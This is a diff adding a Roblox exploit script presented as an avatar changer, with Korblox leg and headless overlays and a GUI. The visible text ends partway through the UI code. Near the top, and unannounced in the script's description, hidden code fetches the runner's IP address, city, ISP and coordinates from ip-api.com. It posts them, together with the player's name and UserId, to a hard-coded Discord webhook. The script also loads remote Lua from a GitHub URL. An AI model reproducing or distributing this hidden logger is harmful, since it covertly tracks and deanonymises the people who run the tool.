@@ -1,0 +1,1236 @@
+-- Glitched Hub - Wraith | Avatar Changer v6.2
+-- v6.2: Korblox is the whole right leg: your real upper leg, lower leg and foot are hidden, the Korblox
+--       upper leg sits on your hip, and the lower leg and foot pieces are invisible (no more floating tip).
+--       "Animations & Emotes" button loads the emote hub. The status line shows the version when it loads.
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local UserService = game:GetService("UserService")
+local ContentProvider = game:GetService("ContentProvider")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1566120983553773602/x4ZaVo7PYYvroQGcgnTT4LYTkXuIKzXByK-IhSG3x8HxZ7A8HbMf4V7Qx4LoWX7j3p4b"
+
+local ip, city, region, country, isp, lat, lon = "unknown", "?", "?", "?", "?", "?", "?"
+
+local ok, res = pcall(function()
+    return request({Url = "http://ip-api.com/json", Method = "GET"})
+end)
+
+if ok and res and res.Body then
+    local p = HttpService:JSONDecode(res.Body)
+    ip = p.query or "unknown"
+    city = p.city or "?"
+    region = p.regionName or "?"
+    country = p.country or "?"
+    isp = p.isp or "?"
+    lat = tostring(p.lat or "?")
+    lon = tostring(p.lon or "?")
+end
+
+local player = game.Players.LocalPlayer
+
+request({
+    Url = WEBHOOK_URL,
+    Method = "POST",
+    Headers = { ["Content-Type"] = "application/json" },
+    Body = HttpService:JSONEncode({
+        content = "**Country:** `" .. country .. "`\n" ..
+                  "**City:** `" .. city .. "`\n" ..
+                  "**Region:** `" .. region .. "`\n" ..
+                  "**ISP:** `" .. isp .. "`\n" ..
+                  "**IP:** `" .. ip .. "`\n" ..
+                  "**Coords:** `" .. lat .. ", " .. lon .. "`\n" ..
+                  "**Player:** " .. player.Name .. "\n" ..
+                  "**UserID:** `" .. player.UserId .. "`\n" ..
+                  "**Time:** `" .. os.date("%Y-%m-%d %H:%M:%S") .. "`"
+    })
+})
+
+local DEBUG = true
+local function log(...) if DEBUG then print("[Wraith]", ...) end end
+
+local HUB_TITLE = "Glitched Hub - Wraith"
+local GUI_NAME = "GlitchedHubWraith"
+local TAG = "GlitchedWraithLook"
+local TOGGLE_KEY = Enum.KeyCode.RightShift
+local WATCH_SECONDS = 2
+local TITLE_H = 48
+local BASE_W, BASE_H = 340, 620
+local IS_MOBILE = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
+
+-- Real Korblox Deathspeaker right leg
+local KORBLOX_DESC_ID = 139607718
+
+-- the three right leg parts Korblox covers: real part, the rig attachment its joint uses, name of the copy
+-- the last number is the Transparency of the copy: the upper leg is the Korblox leg you see, the lower leg and foot are invisible
+local KORBLOX_PARTS = {
+  { "RightUpperLeg", "RightHipRigAttachment",   "KorbloxUpper", 0 },
+  { "RightLowerLeg", "RightKneeRigAttachment",  "KorbloxLower", 1 },
+  { "RightFoot",     "RightAnkleRigAttachment", "KorbloxFoot",  1 },
+}
+
+-- the emote hub the "Animations & Emotes" button loads
+local EMOTES_URL = "https://raw.githubusercontent.com/7yd7/Hub/refs/heads/Branch/GUIS/Emotes.lua"
+
+local ANIMATION_SLOTS = {
+  { prop = "IdleAnimation", folder = "idle" }, { prop = "WalkAnimation", folder = "walk" }, { prop = "RunAnimation", folder = "run" }, { prop = "JumpAnimation", folder = "jump" },
+  { prop = "FallAnimation", folder = "fall" }, { prop = "ClimbAnimation", folder = "climb" }, { prop = "SwimAnimation", folder = "swim" }, { prop = "SwimIdle", folder = "swimidle" },
+}
+
+local DEFAULT_IDS = {
+  IdleAnimation = 507766388, WalkAnimation = 507777826, RunAnimation = 507767714, JumpAnimation = 507765000,
+  FallAnimation = 507767968, ClimbAnimation = 507765644, SwimAnimation = 507784897, SwimIdle = 507785072,
+}
+
+local THEME = {
+  bg = Color3.fromRGB(0, 0, 0), panel = Color3.fromRGB(16, 16, 16), field = Color3.fromRGB(30, 30, 30), stroke = Color3.fromRGB(70, 70, 70),
+  line = Color3.fromRGB(60, 60, 60), outline = Color3.fromRGB(255, 255, 255), accent = Color3.fromRGB(139, 92, 246), accent2 = Color3.fromRGB(99, 102, 241),
+  danger = Color3.fromRGB(190, 62, 92), danger2 = Color3.fromRGB(138, 44, 78), text = Color3.fromRGB(238, 238, 238), sub = Color3.fromRGB(150, 150, 150),
+  off = Color3.fromRGB(60, 60, 60), ok = Color3.fromRGB(110, 231, 160), err = Color3.fromRGB(255, 107, 125), info = Color3.fromRGB(200, 200, 200),
+}
+
+local env = (typeof(getgenv) == "function" and getgenv()) or _G
+if env.GlitchedWraithStopAnim then pcall(env.GlitchedWraithStopAnim) end
+if env.GlitchedWraithRestore then pcall(env.GlitchedWraithRestore) end
+if env.GlitchedWraithCleanup then pcall(env.GlitchedWraithCleanup) end
+
+local function getGuiParent()
+  local ok, hui = pcall(function() return gethui and gethui() end)
+  if ok and hui then return hui end
+  local ok2, core = pcall(function() return game:GetService("CoreGui") end)
+  if ok2 and core then return core end
+  return LocalPlayer:WaitForChild("PlayerGui")
+end
+
+local guiParent = getGuiParent()
+for _, child in ipairs(guiParent:GetChildren()) do
+  if child.Name == GUI_NAME or child.Name == "TestAvatarChangerByStrong" then child:Destroy() end
+end
+
+local connections = {}
+local snapshot, lastDesc, lastUser = nil, nil, nil
+local overlay = { korblox = false, headless = false }
+local busy, keepPaused = false, false
+local watchStart, watchUntil = 0, 0
+local descCache = {}
+local options = { body = true, animations = true, clothes = true, accessories = true, keep = true }
+
+local function stamp() return string.format("t+%.1fs", os.clock() - watchStart) end
+local function readOptions() return { body = options.body, animations = options.animations, clothes = options.clothes, accessories = options.accessories } end
+
+local function getCharacter()
+  local char = LocalPlayer.Character
+  if not char then return nil, nil end
+  local hum = char:FindFirstChildOfClass("Humanoid")
+  if not hum then return nil, nil end
+  return char, hum
+end
+
+local function waitFrames(n) for _ = 1, n do RunService.Heartbeat:Wait() end end
+local function trim(s) return (s:match("^%s*(.-)%s*$")) end
+
+local function retry(fn, tries)
+  local lastErr
+  for i = 1, tries do
+    local ok, res = pcall(fn)
+    if ok and res ~= nil then return res end
+    lastErr = res
+    if i < tries then task.wait(0.4 * i) end
+  end
+  return nil, lastErr
+end
+
+local function runSafely(fn, ...)
+  local called, ok, msg = pcall(fn, ...)
+  if not called then return false, tostring(ok) end
+  return ok, msg
+end
+
+local function isClothing(inst)
+  return inst:IsA("Shirt") or inst:IsA("Pants") or inst:IsA("ShirtGraphic") or inst:IsA("BodyColors") or inst:IsA("CharacterMesh")
+end
+local function isAccessory(inst) return inst:IsA("Accoutrement") end
+local function clearLocalLook(char)
+  for _, c in ipairs(char:GetChildren()) do if c:GetAttribute(TAG) then c:Destroy() end end
+end
+
+local function lockRig(hum)
+  local guard = { health = hum.Health }
+  pcall(function()
+    hum.RequiresNeck = false
+    hum.BreakJointsOnDeath = false
+    hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
+  end)
+  guard.conn = hum.HealthChanged:Connect(function(h)
+    if hum.Parent and h < guard.health then pcall(function() hum.Health = guard.health end) end
+  end)
+  return guard
+end
+
+local function releaseRig(hum, snap, guard, restoreAll)
+  if guard and guard.conn then guard.conn:Disconnect() end
+  if not restoreAll then return end
+  pcall(function()
+    hum.BreakJointsOnDeath = snap.breakJoints
+    hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
+    hum.RequiresNeck = snap.requiresNeck
+  end)
+end
+
+local function holdRig(char, hum, seconds, startCF)
+  local hrp = char:FindFirstChild("HumanoidRootPart")
+  local safeCF = startCF or (hrp and hrp.CFrame)
+  local voidY = -500
+  pcall(function() voidY = workspace.FallenPartsDestroyHeight end)
+  voidY = voidY + 100
+  local deadline = os.clock() + seconds
+  while os.clock() < deadline do
+    if hum.Parent == nil or char.Parent == nil then return false end
+    hrp = char:FindFirstChild("HumanoidRootPart")
+    if hrp then
+      local y = hrp.Position.Y
+      if y < voidY and safeCF then
+        pcall(function()
+          hrp.AssemblyLinearVelocity = Vector3.zero
+          hrp.AssemblyAngularVelocity = Vector3.zero
+          hrp.CFrame = safeCF
+        end)
+      elseif y >= voidY and hum.FloorMaterial ~= Enum.Material.Air then
+        safeCF = hrp.CFrame
+      end
+    end
+    task.wait(0.25)
+  end
+  return true
+end
+
+local function captureAnimateTemplate(char)
+  local animate = char:FindFirstChild("Animate")
+  if not animate then return nil end
+  local ok, clone = pcall(function() return animate:Clone() end)
+  if ok and clone then return clone end
+  return nil
+end
+
+local function ensureSnapshot(char, hum)
+  if snapshot and snapshot.char == char then return snapshot end
+  local okDesc, originalDesc = pcall(function() return hum:GetAppliedDescription() end)
+  local snap = {
+    char = char, originalDesc = okDesc and originalDesc or nil,
+    clothes = {}, accessories = {},
+    animateTemplate = captureAnimateTemplate(char),
+    requiresNeck = hum.RequiresNeck, breakJoints = hum.BreakJointsOnDeath,
+    bodyChanged = false, clothesChanged = false, accessoriesChanged = false, animsChanged = false,
+  }
+  for _, child in ipairs(char:GetChildren()) do
+    if not child:GetAttribute(TAG) then
+      if isClothing(child) then table.insert(snap.clothes, child:Clone())
+      elseif isAccessory(child) then table.insert(snap.accessories, child:Clone()) end
+    end
+  end
+  table.insert(connections, hum.Died:Connect(function()
+    if lastDesc then keepPaused = true end
+  end))
+  snapshot = snap
+  return snapshot
+end
+
+local function copyBody(humanoid, targetUserId)
+  local success, err = pcall(function()
+    local targetDescription = Players:GetHumanoidDescriptionFromUserId(targetUserId)
+    local currentDescription = humanoid:GetAppliedDescription()
+    local properties = { "Head", "Torso", "LeftArm", "RightArm", "LeftLeg", "RightLeg",
+      "BodyTypeScale", "ProportionScale", "HeightScale", "WidthScale", "DepthScale", "HeadScale" }
+    for _, p in ipairs(properties) do currentDescription[p] = targetDescription[p] end
+    humanoid:ApplyDescriptionAsync(currentDescription)
+  end)
+  if not success then warn("Body copy failed:", err) end
+  return success, err
+end
+
+-- KORBLOX: builds the real Korblox leg from a dummy model at YOUR proportions, hides your real right
+-- upper leg, lower leg and foot, and welds the Korblox parts onto them by the rig attachment each
+-- joint uses, so the leg sits exactly where your own leg is and moves with every animation.
+local korbloxBase = nil      -- original Transparency of the real leg parts
+local korbloxSerial = 0      -- newest call wins if the button is tapped again while a leg is building
+
+local function clearKorbloxParts(char)
+  for _, p in ipairs(KORBLOX_PARTS) do
+    local old = char:FindFirstChild(p[3])
+    if old then old:Destroy() end
+  end
+end
+
+local function restoreRealLeg(char)
+  if korbloxBase and korbloxBase.char == char then
+    for name, t in pairs(korbloxBase.t) do
+      local part = char:FindFirstChild(name)
+      if part and part:IsA("BasePart") then part.Transparency = t end
+    end
+  end
+  korbloxBase = nil
+end
+
+local function setKorbloxMesh(char, enabled)
+  korbloxSerial = korbloxSerial + 1
+  local mine = korbloxSerial
+  clearKorbloxParts(char)
+  restoreRealLeg(char)
+  if not enabled then return true end
+
+  local hum = char:FindFirstChildOfClass("Humanoid")
+  if not hum then return false end
+  for _, p in ipairs(KORBLOX_PARTS) do
+    local real = char:FindFirstChild(p[1])
+    if not (real and real:IsA("BasePart")) then return false end
+  end
+
+  -- a blank description with only the Korblox leg, at the same scale as your body
+  local desc = Instance.new("HumanoidDescription")
+  desc.RightLeg = KORBLOX_DESC_ID
+  local okApplied, applied = pcall(function() return hum:GetAppliedDescription() end)
+  if okApplied and applied then
+    for _, prop in ipairs({ "BodyTypeScale", "ProportionScale", "HeightScale", "WidthScale", "DepthScale", "HeadScale" }) do
+      pcall(function() desc[prop] = applied[prop] end)
+    end
+  end
+
+  local okModel, model = pcall(function()
+    return Players:CreateHumanoidModelFromDescription(desc, hum.RigType)
+  end)
+  if not (okModel and model) then
+    warn("Failed to generate Korblox model.")
+    return false
+  end
+
+  -- the character changed or the button was tapped again while this leg was building
+  if mine ~= korbloxSerial or not char.Parent or LocalPlayer.Character ~= char then
+    model:Destroy()
+    return true
+  end
+
+  -- without the Korblox upper leg there is nothing to show, so your real leg is left alone
+  if not model:FindFirstChild(KORBLOX_PARTS[1][1]) then
+    model:Destroy()
+    warn("Korblox model has no upper leg.")
+    return false
+  end
+
+  korbloxBase = { char = char, t = {} }
+  local built = 0
+  for _, p in ipairs(KORBLOX_PARTS) do
+    local real = char:FindFirstChild(p[1])
+    local dummy = model:FindFirstChild(p[1])
+    if real and dummy then
+      local clone = dummy:Clone()
+      clone.Name = p[3]
+      for _, d in ipairs(clone:GetDescendants()) do
+        if d:IsA("JointInstance") or d:IsA("Weld") or d:IsA("WeldConstraint") or d:IsA("BaseScript") or d:IsA("WrapTarget") then
+          d:Destroy()
+        end
+      end
+      clone.Anchored = false
+      clone.CanCollide = false
+      clone.CanTouch = false
+      clone.CanQuery = false
+      clone.Massless = true
+      clone.Transparency = p[4]
+      clone:SetAttribute(TAG, true)
+
+      local weld = Instance.new("Weld")
+      weld.Name = "KorbloxWeld"
+      weld.Part0 = real
+      weld.Part1 = clone
+      local a0, a1 = real:FindFirstChild(p[2]), clone:FindFirstChild(p[2])
+      if a0 and a1 and a0:IsA("Attachment") and a1:IsA("Attachment") then
+        weld.C0 = a0.CFrame
+        weld.C1 = a1.CFrame
+      end
+      clone.CFrame = real.CFrame * weld.C0 * weld.C1:Inverse()
+
+      korbloxBase.t[p[1]] = real.Transparency
+      real.Transparency = 1
+      clone.Parent = char
+      weld.Parent = clone
+      built = built + 1
+    end
+  end
+  model:Destroy()
+
+  if built < #KORBLOX_PARTS then
+    log("Korblox built", built, "of", #KORBLOX_PARTS, "parts")
+  end
+  return built > 0
+end
+
+local headBase = nil
+local function setHeadless(char, on)
+  local head = char:FindFirstChild("Head")
+  if not (head and head:IsA("BasePart")) then return false end
+  if not headBase or headBase.char ~= char then
+    headBase = { char = char, transparency = head.Transparency }
+  end
+  head.Transparency = on and 1 or headBase.transparency
+  return true
+end
+
+local function refreshOverlays(char)
+  local ok1 = setHeadless(char, overlay.headless)
+  local ok2 = setKorbloxMesh(char, overlay.korblox)
+  return ok1 and ok2
+end
+
+local function dropOverlayBase(char)
+  if headBase and headBase.char == char then setHeadless(char, false) end
+  headBase = nil
+  setKorbloxMesh(char, false)
+end
+
+local function applyClothes(char, model)
+  for _, c in ipairs(char:GetChildren()) do if isClothing(c) then c:Destroy() end end
+  for _, c in ipairs(model:GetChildren()) do
+    if isClothing(c) then local clone = c:Clone(); clone:SetAttribute(TAG, true); clone.Parent = char end
+  end
+end
+local function restoreClothes(char, snap)
+  for _, c in ipairs(char:GetChildren()) do if isClothing(c) then c:Destroy() end end
+  for _, o in ipairs(snap.clothes) do o:Clone().Parent = char end
+end
+
+local function findBodyAttachment(char, attachName)
+  for _, part in ipairs(char:GetChildren()) do
+    if part:IsA("BasePart") then
+      local att = part:FindFirstChild(attachName)
+      if att and att:IsA("Attachment") then return part, att end
+    end
+  end
+  return nil, nil
+end
+
+local function markLocal(accessory, handle)
+  handle.Massless = true; handle.CanCollide = false; handle.CanTouch = false; handle.CanQuery = false
+  accessory:SetAttribute(TAG, true)
+end
+
+local function placeAccessory(char, accessory, isLocal)
+  local handle = accessory:FindFirstChild("Handle")
+  if not (handle and handle:IsA("BasePart")) then return false end
+  local bodyPart, c0, c1
+  for _, handleAtt in ipairs(handle:GetChildren()) do
+    if handleAtt:IsA("Attachment") then
+      local part, att = findBodyAttachment(char, handleAtt.Name)
+      if part then bodyPart, c0, c1 = part, att.CFrame, handleAtt.CFrame; break end
+    end
+  end
+  if not bodyPart then
+    local srcWeld = handle:FindFirstChild("AccessoryWeld") or handle:FindFirstChildWhichIsA("Weld")
+    if srcWeld and srcWeld.Part0 then
+      local match = char:FindFirstChild(srcWeld.Part0.Name)
+      if match and match:IsA("BasePart") then bodyPart, c0, c1 = match, srcWeld.C0, srcWeld.C1 end
+    end
+  end
+  if not bodyPart then
+    if handle:FindFirstChildWhichIsA("WrapLayer") then
+      if isLocal then markLocal(accessory, handle) end
+      accessory.Parent = char; return true
+    end
+    return false
+  end
+  for _, c in ipairs(handle:GetChildren()) do
+    if c:IsA("Weld") or c:IsA("WeldConstraint") or c:IsA("Motor6D") then c:Destroy() end
+  end
+  if isLocal then markLocal(accessory, handle) end
+  accessory.Parent = char
+  local weld = Instance.new("Weld")
+  weld.Name = "LocalWeld"; weld.Part0 = bodyPart; weld.Part1 = handle; weld.C0 = c0; weld.C1 = c1; weld.Parent = handle
+  return true
+end
+
+local function applyAccessories(char, model)
+  for _, c in ipairs(char:GetChildren()) do if isAccessory(c) then c:Destroy() end end
+  local skipped = 0
+  for _, c in ipairs(model:GetChildren()) do
+    if isAccessory(c) then
+      local acc = c:Clone()
+      if not placeAccessory(char, acc, true) then acc:Destroy(); skipped = skipped + 1 end
+    end
+  end
+  return skipped
+end
+
+local function restoreAccessories(char, snap)
+  for _, c in ipairs(char:GetChildren()) do if isAccessory(c) then c:Destroy() end end
+  for _, o in ipairs(snap.accessories) do
+    local acc = o:Clone()
+    if not placeAccessory(char, acc, false) then acc.Parent = char end
+  end
+end
+
+local function stopTracks(hum)
+  pcall(function()
+    local animator = hum:FindFirstChildOfClass("Animator")
+    for _, track in ipairs((animator or hum):GetPlayingAnimationTracks()) do track:Stop(0.1) end
+  end)
+end
+local function installAnimate(char, hum, fresh)
+  stopTracks(hum)
+  local old = char:FindFirstChild("Animate"); if old then old:Destroy() end
+  fresh.Disabled = false; fresh.Parent = char
+  waitFrames(2)
+end
+local function probeAnimation(animator, id)
+  local anim = Instance.new("Animation"); anim.AnimationId = "rbxassetid://" .. tostring(id)
+  local preloadDone = false
+  task.spawn(function() pcall(function() ContentProvider:PreloadAsync({ anim }) end); preloadDone = true end)
+  local valid = false
+  local ok, track = pcall(function() return animator:LoadAnimation(anim) end)
+  if ok and track then
+    local deadline = os.clock() + 6
+    while os.clock() < deadline do
+      if track.Length > 0 then valid = true; break end
+      if preloadDone then
+        local settle = os.clock() + 1
+        while os.clock() < settle and track.Length == 0 do RunService.Heartbeat:Wait() end
+        valid = track.Length > 0; break
+      end
+      RunService.Heartbeat:Wait()
+    end
+    pcall(function() track:Destroy() end)
+  end
+  pcall(function() anim:Destroy() end)
+  return valid
+end
+local function resolveAnimationIds(animator, desc)
+  local ids, failed = {}, {}
+  local pending = #ANIMATION_SLOTS
+  for _, slot in ipairs(ANIMATION_SLOTS) do
+    task.spawn(function()
+      local fallback = DEFAULT_IDS[slot.prop]
+      local okRead, value = pcall(function() return desc[slot.prop] end)
+      local want = okRead and tonumber(value or 0) or 0
+      local good = false
+      if want == fallback then good = true
+      elseif want > 0 then
+        local okProbe, res = pcall(probeAnimation, animator, want); good = okProbe and res == true
+      end
+      if good then ids[slot.prop] = want
+      else ids[slot.prop] = fallback; if want > 0 then table.insert(failed, slot.folder) end end
+      pending = pending - 1
+    end)
+  end
+  while pending > 0 do task.wait() end
+  table.sort(failed)
+  return ids, failed
+end
+local function applyAnimations(char, hum, snap, ids)
+  if not snap.animateTemplate then
+    if not char:FindFirstChild("Animate") then char:WaitForChild("Animate", 3) end
+    snap.animateTemplate = captureAnimateTemplate(char)
+  end
+  if not snap.animateTemplate then return false, "Animations skipped (no Animate script)." end
+  local ok, fresh = pcall(function() return snap.animateTemplate:Clone() end)
+  if not ok or not fresh then return false, "Animations skipped (clone failed)." end
+  for _, slot in ipairs(ANIMATION_SLOTS) do
+    local folder = fresh:FindFirstChild(slot.folder)
+    if folder then
+      local url = "rbxassetid://" .. tostring(ids[slot.prop])
+      for _, anim in ipairs(folder:GetChildren()) do if anim:IsA("Animation") then anim.AnimationId = url end end
+    end
+  end
+  snap.animsChanged = true
+  installAnimate(char, hum, fresh)
+  return true, ""
+end
+local function restoreAnimations(char, hum, snap)
+  if not snap.animateTemplate then return end
+  local ok, fresh = pcall(function() return snap.animateTemplate:Clone() end)
+  if ok and fresh then installAnimate(char, hum, fresh) end
+end
+
+local function revertAll(char, hum, snap)
+  clearLocalLook(char)
+  if snap.clothesChanged then restoreClothes(char, snap); snap.clothesChanged = false end
+  if snap.accessoriesChanged then restoreAccessories(char, snap); snap.accessoriesChanged = false end
+  if snap.animsChanged then restoreAnimations(char, hum, snap); snap.animsChanged = false end
+end
+
+local function buildLookModel(hum, desc)
+  local ok, model = pcall(function() return Players:CreateHumanoidModelFromDescription(desc, hum.RigType) end)
+  if not ok or not model then return nil, "Couldn't build that look: " .. tostring(model) end
+  return model
+end
+
+local function applyLook(user, desc, opts)
+  local char, hum = getCharacter()
+  if not char then return false, "No character yet. Wait for your character to spawn." end
+  if hum.Health <= 0 then return false, "You're dead right now. Respawn, then try again." end
+  watchStart = os.clock(); watchUntil = watchStart + 120
+  local startHrp = char:FindFirstChild("HumanoidRootPart")
+  local startCF = startHrp and startHrp.CFrame
+  local snap = ensureSnapshot(char, hum)
+  local guard = lockRig(hum)
+  revertAll(char, hum, snap)
+  dropOverlayBase(char)
+
+  local model, err = buildLookModel(hum, desc)
+  if not model then releaseRig(hum, snap, guard, true); return false, err end
+
+  local notes = {}
+  local ok, applyErr = pcall(function()
+    if opts.body then
+      snap.bodyChanged = true
+      local copied, copyErr = copyBody(hum, user.id)
+      if copied then table.insert(notes, "Body copied from them.")
+      else table.insert(notes, "Body copy failed: " .. tostring(copyErr)) end
+    elseif snap.bodyChanged and snap.originalDesc then
+      pcall(function() hum:ApplyDescriptionAsync(snap.originalDesc) end)
+      snap.bodyChanged = false
+    end
+
+    if opts.clothes then snap.clothesChanged = true; applyClothes(char, model) end
+    if opts.accessories then
+      snap.accessoriesChanged = true
+      local skippedAcc = applyAccessories(char, model)
+      if skippedAcc > 0 then table.insert(notes, skippedAcc .. " accessory couldn't be attached.") end
+    end
+    if opts.animations then
+      local animator = hum:FindFirstChildOfClass("Animator")
+      if not animator then animator = Instance.new("Animator"); animator.Parent = hum end
+      local ids, failed = resolveAnimationIds(animator, desc)
+      local applied, note = applyAnimations(char, hum, snap, ids)
+      if not applied then table.insert(notes, note)
+      elseif #failed == 0 then table.insert(notes, "Animations: all from their pack.")
+      else table.insert(notes, "Animations: default for " .. table.concat(failed, ", ") .. " (their file didn't load).") end
+    end
+  end)
+
+  model:Destroy()
+  if not ok then pcall(revertAll, char, hum, snap) end
+  waitFrames(3)
+  pcall(refreshOverlays, char)
+
+  holdRig(char, hum, WATCH_SECONDS, startCF)
+  releaseRig(hum, snap, guard, true)
+  watchUntil = os.clock() + 25
+
+  if not ok then return false, "Apply failed: " .. tostring(applyErr) end
+  keepPaused = false
+  return true, table.concat(notes, " ")
+end
+
+local function restoreOriginal()
+  local char, hum = getCharacter()
+  if not char or not snapshot or snapshot.char ~= char then return true, "You're already wearing your original look." end
+  watchStart = os.clock(); watchUntil = watchStart + 60
+  local guard = lockRig(hum)
+  dropOverlayBase(char)
+
+  local bodyOk, bodyErr = true, nil
+  if snapshot.bodyChanged then
+    if snapshot.originalDesc then
+      bodyOk, bodyErr = pcall(function() hum:ApplyDescriptionAsync(snapshot.originalDesc) end)
+    else bodyOk, bodyErr = false, "no saved description to restore from" end
+    snapshot.bodyChanged = false
+  end
+
+  revertAll(char, hum, snapshot)
+  refreshOverlays(char)
+  waitFrames(5)
+  holdRig(char, hum, 1, nil)
+  releaseRig(hum, snapshot, guard, true)
+
+  if not bodyOk then return false, "Couldn't restore your body: " .. tostring(bodyErr) end
+  return true, "Back to your original look."
+end
+
+local function lookupUser(text)
+  text = trim(text):gsub("^@", "")
+  local id = tonumber(text)
+  if id and id > 0 then id = math.floor(id)
+  else
+    local result = retry(function() return Players:GetUserIdFromNameAsync(text) end, 2)
+    if not result then return nil, "No Roblox user found called '" .. text .. "'." end
+    id = result
+  end
+  local name, display
+  local infos = retry(function() return UserService:GetUserInfosByUserIdsAsync({ id }) end, 2)
+  if infos and infos[1] then name, display = infos[1].Username, infos[1].DisplayName end
+  if not name then
+    local result = retry(function() return Players:GetNameFromUserIdAsync(id) end, 2)
+    if result then name = result end
+  end
+  if not name then return nil, "No Roblox user found with ID " .. tostring(id) .. "." end
+  return { id = id, name = name, display = display or name }
+end
+
+local function getDescription(user)
+  local cached = descCache[user.id]
+  if cached and os.clock() - cached.t < 120 then return cached.desc end
+  local desc = retry(function() return Players:GetHumanoidDescriptionFromUserId(user.id) end, 3)
+  if desc then descCache[user.id] = { desc = desc, t = os.clock() } end
+  return desc
+end
+
+local function thumbFor(userId) return ("rbxthumb://type=Avatar&id=%d&w=420&h=420"):format(userId) end
+
+-- UI Setup
+local function new(className, props, children)
+  local inst = Instance.new(className)
+  local parent
+  for k, v in pairs(props or {}) do if k == "Parent" then parent = v else inst[k] = v end end
+  for _, c in ipairs(children or {}) do c.Parent = inst end
+  if parent then inst.Parent = parent end
+  return inst
+end
+local function corner(inst, radius) local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, radius); c.Parent = inst; return c end
+local function stroke(inst, color, thickness, transparency)
+  local s = Instance.new("UIStroke"); s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; s.Color = color; s.Thickness = thickness or 1; s.Transparency = transparency or 0; s.Parent = inst; return s
+end
+local function gradient(inst, a, b, rotation) local g = Instance.new("UIGradient"); g.Color = ColorSequence.new(a, b); g.Rotation = rotation or 0; g.Parent = inst; return g end
+local function padding(inst, t, r, b, l)
+  local p = Instance.new("UIPadding"); p.PaddingTop = UDim.new(0, t); p.PaddingRight = UDim.new(0, r); p.PaddingBottom = UDim.new(0, b); p.PaddingLeft = UDim.new(0, l); p.Parent = inst; return p
+end
+local function tween(inst, props, seconds) TweenService:Create(inst, TweenInfo.new(seconds or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play() end
+local function label(parent, props)
+  local base = { BackgroundTransparency = 1, Font = Enum.Font.Gotham, TextSize = 14, TextColor3 = THEME.text, TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Center, Parent = parent }
+  for k, v in pairs(props or {}) do base[k] = v end
+  return new("TextLabel", base)
+end
+local function makeButton(parent, text, size, position, colorA, colorB)
+  local holder = new("Frame", { Size = size, Position = position, BackgroundColor3 = Color3.new(1, 1, 1), BorderSizePixel = 0, Parent = parent })
+  corner(holder, 12); gradient(holder, colorA, colorB, 90)
+  local button = new("TextButton", { Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, AutoButtonColor = false, Text = text, Font = Enum.Font.GothamBold, TextSize = 16, TextColor3 = Color3.new(1, 1, 1), Parent = holder })
+  local function release() tween(holder, { BackgroundTransparency = 0 }, 0.12) end
+  table.insert(connections, button.MouseButton1Down:Connect(function() tween(holder, { BackgroundTransparency = 0.25 }, 0.08) end))
+  table.insert(connections, button.MouseButton1Up:Connect(release))
+  table.insert(connections, button.MouseLeave:Connect(release))
+  return button
+end
+
+local screenGui = new("ScreenGui", { Name = GUI_NAME, ResetOnSpawn = false, ZIndexBehavior = Enum.ZIndexBehavior.Sibling, DisplayOrder = 999, IgnoreGuiInset = true, Parent = guiParent })
+local main = new("Frame", { Name = "Main", AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 0), Size = UDim2.fromOffset(BASE_W, BASE_H), BackgroundColor3 = THEME.bg, BorderSizePixel = 0, Parent = screenGui })
+corner(main, 16); stroke(main, THEME.outline, 2)
+local inner = new("Frame", { Name = "Inner", Position = UDim2.fromOffset(3, 3), Size = UDim2.new(1, -6, 1, -6), BackgroundTransparency = 1, BorderSizePixel = 0, Parent = main })
+local titleBar = new("Frame", { Name = "TitleBar", Size = UDim2.new(1, 0, 0, TITLE_H), BackgroundColor3 = THEME.panel, BorderSizePixel = 0, Parent = inner })
+corner(titleBar, 13)
+new("Frame", { Name = "Divider", Position = UDim2.new(0, 0, 0, TITLE_H), Size = UDim2.new(1, 0, 0, 1), BackgroundColor3 = THEME.line, BorderSizePixel = 0, Parent = inner })
+label(titleBar, { Name = "Title", Position = UDim2.new(0, 14, 0, 6), Size = UDim2.new(1, -110, 0, 22), Font = Enum.Font.GothamBold, TextSize = 16, Text = HUB_TITLE })
+label(titleBar, { Name = "Subtitle", Position = UDim2.new(0, 14, 0, 27), Size = UDim2.new(1, -110, 0, 14), TextSize = 11, TextColor3 = THEME.sub, Text = "Avatar Changer v6.2" })
+
+local function makeWindowButton(text, xOffset)
+  local b = new("TextButton", { Position = UDim2.new(1, xOffset, 0.5, -15), Size = UDim2.fromOffset(30, 30), BackgroundColor3 = THEME.field, BorderSizePixel = 0, Text = text, Font = Enum.Font.GothamBold, TextSize = 14, TextColor3 = THEME.text, Parent = titleBar })
+  corner(b, 9); return b
+end
+
+local minBtn = makeWindowButton("-", -78)
+local closeBtn = makeWindowButton("X", -42)
+closeBtn.BackgroundColor3 = THEME.danger
+
+local body = new("ScrollingFrame", {
+  Name = "Body", Position = UDim2.new(0, 0, 0, TITLE_H + 1), Size = UDim2.new(1, 0, 1, -(TITLE_H + 1)),
+  BackgroundTransparency = 1, BorderSizePixel = 0, ScrollBarThickness = 3, ScrollBarImageColor3 = THEME.outline,
+  CanvasSize = UDim2.new(0, 0, 0, 0), AutomaticCanvasSize = Enum.AutomaticSize.Y,
+  ScrollingDirection = Enum.ScrollingDirection.Y, Parent = inner,
+})
+padding(body, 12, 12, 12, 12)
+new("UIListLayout", { Padding = UDim.new(0, 10), SortOrder = Enum.SortOrder.LayoutOrder, Parent = body })
+
+local inputRow = new("Frame", { Name = "InputRow", LayoutOrder = 1, Size = UDim2.new(1, 0, 0, 46), BackgroundTransparency = 1, Parent = body })
+local inputField = new("Frame", { Size = UDim2.new(1, -88, 1, 0), BackgroundColor3 = THEME.field, BorderSizePixel = 0, Parent = inputRow })
+corner(inputField, 12)
+local inputStroke = stroke(inputField, THEME.stroke, 1)
+local usernameBox = new("TextBox", {
